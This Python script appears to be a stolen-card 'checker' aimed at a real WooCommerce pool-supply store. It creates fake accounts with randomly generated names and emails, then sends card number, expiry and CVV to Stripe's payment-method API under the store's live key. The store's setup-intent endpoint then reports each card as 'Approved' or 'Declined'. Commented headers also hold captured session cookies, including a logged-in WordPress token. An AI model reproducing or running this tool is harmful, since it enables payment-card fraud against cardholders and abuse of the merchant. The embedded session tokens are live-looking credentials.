
import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid




direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class stripe2:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):
        try:
            session = requests.Session()
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'max-age=0',
                    'priority': 'u=0, i',
                    'referer': 'https://store.splashsupplyco.com/account/add-payment-method/',
                    'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                    # 'cookie': '__cf_bm=4D3Jp1NgSkVKSbo1IdOVTuGsuKLIf8JQ8ZcyaaHLNhI-1768719010-1.0.1.1-tR4z3xCFCVDsgMFl2U0F2S6qPqrugHoqXm3OkazbRmUWhthr1hdF2oRsF1kpbtKR4JyKuYPIojnfVeSIqJgiEerT7p9NbQpteBa8dsYRoDc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; cf_clearance=ex17AQNGm3AlM_wlGo9WiWWzTxChfZD9V3l_U7rciGQ-1768719018-1.2.1.1-hKGrJpKtRgCYXB.0wlcUhrU5ZXXZd4QpBbUmhzj3mntt3k5V7MGyA2F9SGlf9J1RrtzIHSMx52KFPvhDHjnZoiF666WOxMunXm5Kzt0tOLScZzGZBMl.aGMH3bxqw69zbM_Q7qsHPgVwVnARAl5wefpmyk_csaY9yNBihidlN08VF7nktKFIgsPpKgljVvH8vnIj2gvGns1Ap95JkX57E6AW1lAZyoVjaW9Yu1CclkA; __stripe_mid=6a323504-6a9b-45ce-b9db-5151a35feaa8cddda6; __stripe_sid=19051175-1fb1-4919-9e6f-6e89a0e3c08ed8952a; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Faccount%2F',
                }

            response = session.get('https://store.splashsupplyco.com/account/', headers=headers).text
            reg = find_between(response, 'name="woocommerce-register-nonce" value="', '"')
            print(reg)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://store.splashsupplyco.com',
                'priority': 'u=0, i',
                'referer': 'https://store.splashsupplyco.com/account/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': '__cf_bm=4D3Jp1NgSkVKSbo1IdOVTuGsuKLIf8JQ8ZcyaaHLNhI-1768719010-1.0.1.1-tR4z3xCFCVDsgMFl2U0F2S6qPqrugHoqXm3OkazbRmUWhthr1hdF2oRsF1kpbtKR4JyKuYPIojnfVeSIqJgiEerT7p9NbQpteBa8dsYRoDc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; cf_clearance=ex17AQNGm3AlM_wlGo9WiWWzTxChfZD9V3l_U7rciGQ-1768719018-1.2.1.1-hKGrJpKtRgCYXB.0wlcUhrU5ZXXZd4QpBbUmhzj3mntt3k5V7MGyA2F9SGlf9J1RrtzIHSMx52KFPvhDHjnZoiF666WOxMunXm5Kzt0tOLScZzGZBMl.aGMH3bxqw69zbM_Q7qsHPgVwVnARAl5wefpmyk_csaY9yNBihidlN08VF7nktKFIgsPpKgljVvH8vnIj2gvGns1Ap95JkX57E6AW1lAZyoVjaW9Yu1CclkA; __stripe_mid=6a323504-6a9b-45ce-b9db-5151a35feaa8cddda6; __stripe_sid=19051175-1fb1-4919-9e6f-6e89a0e3c08ed8952a; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Faccount%2F',
            }

            data = {
                'email': self.CorreoRand,
                'password': 'leito132asd',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://store.splashsupplyco.com/product-category/filtration/skimming-filtration/',
                'wc_order_attribution_session_start_time': '2026-01-18 06:50:15',
                'wc_order_attribution_session_pages': '9',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': reg,
                '_wp_http_referer': '/account/',
                'register': 'Register',
            }

            response = session.post('https://store.splashsupplyco.com/account/',  headers=headers, data=data)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://store.splashsupplyco.com/account/payment-methods/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': '__cf_bm=4D3Jp1NgSkVKSbo1IdOVTuGsuKLIf8JQ8ZcyaaHLNhI-1768719010-1.0.1.1-tR4z3xCFCVDsgMFl2U0F2S6qPqrugHoqXm3OkazbRmUWhthr1hdF2oRsF1kpbtKR4JyKuYPIojnfVeSIqJgiEerT7p9NbQpteBa8dsYRoDc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; cf_clearance=ex17AQNGm3AlM_wlGo9WiWWzTxChfZD9V3l_U7rciGQ-1768719018-1.2.1.1-hKGrJpKtRgCYXB.0wlcUhrU5ZXXZd4QpBbUmhzj3mntt3k5V7MGyA2F9SGlf9J1RrtzIHSMx52KFPvhDHjnZoiF666WOxMunXm5Kzt0tOLScZzGZBMl.aGMH3bxqw69zbM_Q7qsHPgVwVnARAl5wefpmyk_csaY9yNBihidlN08VF7nktKFIgsPpKgljVvH8vnIj2gvGns1Ap95JkX57E6AW1lAZyoVjaW9Yu1CclkA; __stripe_mid=6a323504-6a9b-45ce-b9db-5151a35feaa8cddda6; __stripe_sid=19051175-1fb1-4919-9e6f-6e89a0e3c08ed8952a; wordpress_logged_in_fadb3eb8ae9e559dafb6ffa6f1414d2b=aladanube%7C1769928864%7Cu7Wjvg0EBEg6kqXQ0uH8bzsmZBWk3nJ6F2TNfS9aUke%7Ca6bcdde973516bac387ad71563ac0ec8f41983fb7127d07b7a28af415cb91a1b; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Faccount%2Fpayment-methods%2F',
            }

            response = session.get('https://store.splashsupplyco.com/account/add-payment-method/',headers=headers).text
            addp = find_between(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            aja = find_between(response, '"createAndConfirmSetupIntentNonce":"','"')
            print(aja)
        
            headers = {
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={self.cc}&card[cvc]={self.cvv}&card[exp_year]={self.ano}&card[exp_month]={self.mes}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F83a1f53796%3B+stripe-js-v3%2F83a1f53796%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fstore.splashsupplyco.com&time_on_page=117613&client_attribution_metadata[client_session_id]=7e7dc0e6-8f41-4398-b2f5-b246ae38ac4e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7006450d-04af-43b5-ae04-7d4693bfc6df&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51FS3OUJfEHCkTRT8oaBP8wDHcM9Twf5bT65VAt0hYCzcYVs8PCx6ZjKFCMxOA3oSx8faCs6yxUefNNe34yyI4QSt00ulaVI4gJ&_stripe_version=2024-06-20&radar_options'
            response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            id = response['id']
            print(id)
            

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://store.splashsupplyco.com',
                'priority': 'u=1, i',
                'referer': 'https://store.splashsupplyco.com/account/add-payment-method/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_fadb3eb8ae9e559dafb6ffa6f1414d2b=aladanube%7C1769928864%7Cu7Wjvg0EBEg6kqXQ0uH8bzsmZBWk3nJ6F2TNfS9aUke%7C9f280b5ec6c78b001c0b56e2725d57d6188a7fb2676c409f2ad34c843f10ce4b; __cf_bm=4D3Jp1NgSkVKSbo1IdOVTuGsuKLIf8JQ8ZcyaaHLNhI-1768719010-1.0.1.1-tR4z3xCFCVDsgMFl2U0F2S6qPqrugHoqXm3OkazbRmUWhthr1hdF2oRsF1kpbtKR4JyKuYPIojnfVeSIqJgiEerT7p9NbQpteBa8dsYRoDc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-18%2006%3A50%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Fproduct-category%2Ffiltration%2Fskimming-filtration%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; cf_clearance=ex17AQNGm3AlM_wlGo9WiWWzTxChfZD9V3l_U7rciGQ-1768719018-1.2.1.1-hKGrJpKtRgCYXB.0wlcUhrU5ZXXZd4QpBbUmhzj3mntt3k5V7MGyA2F9SGlf9J1RrtzIHSMx52KFPvhDHjnZoiF666WOxMunXm5Kzt0tOLScZzGZBMl.aGMH3bxqw69zbM_Q7qsHPgVwVnARAl5wefpmyk_csaY9yNBihidlN08VF7nktKFIgsPpKgljVvH8vnIj2gvGns1Ap95JkX57E6AW1lAZyoVjaW9Yu1CclkA; __stripe_mid=6a323504-6a9b-45ce-b9db-5151a35feaa8cddda6; __stripe_sid=19051175-1fb1-4919-9e6f-6e89a0e3c08ed8952a; wordpress_logged_in_fadb3eb8ae9e559dafb6ffa6f1414d2b=aladanube%7C1769928864%7Cu7Wjvg0EBEg6kqXQ0uH8bzsmZBWk3nJ6F2TNfS9aUke%7Ca6bcdde973516bac387ad71563ac0ec8f41983fb7127d07b7a28af415cb91a1b; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.splashsupplyco.com%2Faccount%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': aja,
            }

            response = session.post('https://store.splashsupplyco.com/wp-admin/admin-ajax.php', headers=headers, data=data)
            data = response.json()
            print(data)
            error = data['success'] and data['data']['status'] == 'succeeded'
            if error: return 'Approved! ✅', data['data']['status']
            else: return 'Declined ❌', data['data']['status']
        except: return 'Declined ❌','Your card was declined.'
        
"""
ccs = input('ccs: ')
chk = stripe2(ccs).main()
print(chk)
"""